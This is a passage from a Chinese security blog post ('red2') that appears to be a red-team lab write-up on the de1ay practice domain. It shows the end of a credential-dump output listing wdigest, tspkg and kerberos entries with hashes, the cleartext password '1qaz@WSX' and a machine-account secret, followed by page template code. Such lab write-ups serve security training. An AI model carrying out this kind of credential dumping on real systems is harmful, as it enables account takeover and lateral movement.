<span class="hljs-number">772875</span>f<span class="hljs-number">1</span>b<span class="hljs-number">0e41</span>        <span class="hljs-number">0076</span>ec<span class="hljs-number">4869</span>f<span class="hljs-number">3</span>ecf<span class="hljs-number">5792</span><br>                                                                   <span class="hljs-number">95</span><br>  de<span class="hljs-number">1</span>ay          DE<span class="hljs-number">1</span>AY   f<span class="hljs-number">67</span>ce<span class="hljs-number">55</span>ac<span class="hljs-number">831223</span>dc<span class="hljs-number">18</span>  <span class="hljs-number">161</span>cff<span class="hljs-number">084477</span>fe<span class="hljs-number">596</span>a<span class="hljs-number">5</span>  d<span class="hljs-number">669</span>f<span class="hljs-number">3</span>bccf<span class="hljs-number">14</span>bf<span class="hljs-number">77</span>d<span class="hljs-number">64</span><br>                         <span class="hljs-number">7</span>b<span class="hljs-number">8085</span>fe<span class="hljs-number">1</span>d<span class="hljs-number">9</span>df        db<span class="hljs-number">81874498</span>a<span class="hljs-number">24</span>        <span class="hljs-number">667</span>ec<span class="hljs-number">65</span>aae<span class="hljs-number">32</span>d<span class="hljs-number">2</span>d<span class="hljs-number">1003</span><br>                                                                   <span class="hljs-number">9</span>d<br>  de<span class="hljs-number">1</span>ay          WEB     f<span class="hljs-number">67</span>ce<span class="hljs-number">55</span>ac<span class="hljs-number">831223</span>dc<span class="hljs-number">18</span>  <span class="hljs-number">161</span>cff<span class="hljs-number">084477</span>fe<span class="hljs-number">596</span>a<span class="hljs-number">5</span>  d<span class="hljs-number">669</span>f<span class="hljs-number">3</span>bccf<span class="hljs-number">14</span>bf<span class="hljs-number">77</span>d<span class="hljs-number">64</span><br>                         <span class="hljs-number">7</span>b<span class="hljs-number">8085</span>fe<span class="hljs-number">1</span>d<span class="hljs-number">9</span>df        db<span class="hljs-number">81874498</span>a<span class="hljs-number">24</span>        <span class="hljs-number">667</span>ec<span class="hljs-number">65</span>aae<span class="hljs-number">32</span>d<span class="hljs-number">2</span>d<span class="hljs-number">1003</span><br>                                                                   <span class="hljs-number">9</span>d<br>  mssql          DE<span class="hljs-number">1</span>AY   f<span class="hljs-number">67</span>ce<span class="hljs-number">55</span>ac<span class="hljs-number">831223</span>dc<span class="hljs-number">18</span>  <span class="hljs-number">161</span>cff<span class="hljs-number">084477</span>fe<span class="hljs-number">596</span>a<span class="hljs-number">5</span>  d<span class="hljs-number">669</span>f<span class="hljs-number">3</span>bccf<span class="hljs-number">14</span>bf<span class="hljs-number">77</span>d<span class="hljs-number">64</span><br>                         <span class="hljs-number">7</span>b<span class="hljs-number">8085</span>fe<span class="hljs-number">1</span>d<span class="hljs-number">9</span>df        db<span class="hljs-number">81874498</span>a<span class="hljs-number">24</span>        <span class="hljs-number">667</span>ec<span class="hljs-number">65</span>aae<span class="hljs-number">32</span>d<span class="hljs-number">2</span>d<span class="hljs-number">1003</span><br>                                                                   <span class="hljs-number">9</span>d<br>  <br>  wdigest credentials<br>  <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>  <br>  Username       Domain  Password<br>  --------       ------  --------<br>  (<span class="hljs-keyword">null</span>)         (<span class="hljs-keyword">null</span>)  (<span class="hljs-keyword">null</span>)<br>  Administrator  DE<span class="hljs-number">1</span>AY   <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  WEB$           DE<span class="hljs-number">1</span>AY   `rivzEuKjb<span class="hljs-number">1</span>zX_:+MFm )<span class="hljs-punctuation">,</span>F:+Z&amp;<span class="hljs-comment">;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;</span><br>                         <span class="hljs-number">4</span><span class="hljs-number">+2</span>&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/<span class="hljs-number">32</span>t<span class="hljs-title">!t</span><span class="hljs-comment">;c5\lo .SMii3d=&amp;)BB\0bo$</span><br>  de<span class="hljs-number">1</span>ay          DE<span class="hljs-number">1</span>AY   <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  de<span class="hljs-number">1</span>ay          WEB     <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  mssql          DE<span class="hljs-number">1</span>AY   <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  <br>  tspkg credentials<br>  <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>  <br>  Username       Domain  Password<br>  --------       ------  --------<br>  Administrator  DE<span class="hljs-number">1</span>AY   <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  WEB$           DE<span class="hljs-number">1</span>AY   `rivzEuKjb<span class="hljs-number">1</span>zX_:+MFm )<span class="hljs-punctuation">,</span>F:+Z&amp;<span class="hljs-comment">;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;</span><br>                         <span class="hljs-number">4</span><span class="hljs-number">+2</span>&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/<span class="hljs-number">32</span>t<span class="hljs-title">!t</span><span class="hljs-comment">;c5\lo .SMii3d=&amp;)BB\0bo$</span><br>  de<span class="hljs-number">1</span>ay          DE<span class="hljs-number">1</span>AY   <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  de<span class="hljs-number">1</span>ay          WEB     <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  mssql          DE<span class="hljs-number">1</span>AY   <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  <br>  kerberos credentials<br>  <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>  <br>  Username       Domain     Password<br>  --------       ------     --------<br>  (<span class="hljs-keyword">null</span>)         (<span class="hljs-keyword">null</span>)     (<span class="hljs-keyword">null</span>)<br>  Administrator  de<span class="hljs-number">1</span>ay.com  <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  Administrator  DE<span class="hljs-number">1</span>AY.COM  <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  WEB$           de<span class="hljs-number">1</span>ay.com  `rivzEuKjb<span class="hljs-number">1</span>zX_:+MFm )<span class="hljs-punctuation">,</span>F:+Z&amp;<span class="hljs-comment">;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0</span><br>                            C&amp;&gt;<span class="hljs-number">4</span><span class="hljs-number">+2</span>&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/<span class="hljs-number">32</span>t<span class="hljs-title">!t</span><span class="hljs-comment">;c5\lo .SMii3d=&amp;)BB\</span><br>                            <span class="hljs-number">0</span>bo$<br>  de<span class="hljs-number">1</span>ay          DE<span class="hljs-number">1</span>AY.COM  <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  de<span class="hljs-number">1</span>ay          WEB        <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  mssql          DE<span class="hljs-number">1</span>AY.COM  <span class="hljs-number">1</span>qaz<span class="hljs-title">@WSX</span><br>  web$           DE<span class="hljs-number">1</span>AY.COM  `rivzEuKjb<span class="hljs-number">1</span>zX_:+MFm )<span class="hljs-punctuation">,</span>F:+Z&amp;<span class="hljs-comment">;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0</span><br>                            C&amp;&gt;<span class="hljs-number">4</span><span class="hljs-number">+2</span>&gt;jy:mGgA?&#x27;HKE_rxjdU$#ZHNhx/<span class="hljs-number">32</span>t<span class="hljs-title">!t</span><span class="hljs-comment">;c5\lo .SMii3d=&amp;)BB\</span><br>                            <span class="hljs-number">0</span>bo$<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/zh-CN/categories/web-security/" class="category-chain-item">web security</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/zh-CN/tags/web-security/" class="print-no-link">#web security</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>red2</div>
+      <div>https://ixpqxi.github.io/zh-CN/2023/03/28/66d37d22c2eb/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ixpqxi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/zh-CN/2023/04/22/70e9fccdbad8/" title="内网渗透">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网渗透</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/zh-CN/2023/03/08/8f9ccae36893/" title="Web漏洞">
+                        <span class="hidden-mobile">Web漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"ixpqxi/ixpqxi.github.io","repo-id":"R_kgDOMZIPiQ","category":"Announcements","category-id":"DIC_kwDOMZIPic4C-cY_","mapping":"pathname","strict":0,"reactions-enabled":1,"emit-metadata":0,"input-position":"top","theme":"light","theme-dark":"dark","lang":"en","loading":"lazy"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+    <a href="/zh-CN/atom.xml">RSS</a>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/zh-CN/js/events.js" ></script>
+<script  src="/zh-CN/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/zh-CN/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/zh-CN/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/zh-CN/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
